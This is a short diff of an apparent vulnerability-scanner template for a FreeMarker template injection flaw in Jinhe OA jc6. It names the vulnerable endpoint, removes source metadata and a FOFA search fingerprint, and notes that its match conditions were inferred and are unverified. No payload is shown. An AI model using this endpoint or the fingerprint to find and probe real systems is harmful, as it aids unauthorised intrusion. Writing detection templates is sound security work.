@@ -3,14 +3,8 @@ info:
   name: 金和OA jc6 viewConTemplate.action存在FreeMarker模板注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iusy192r4mf8ml4f
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: iusy192r4mf8ml4f
-    fofa: body="/CDGServer3/index.jsp"
 http:
 - raw:
   - 'POST /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action HTTP/1.1
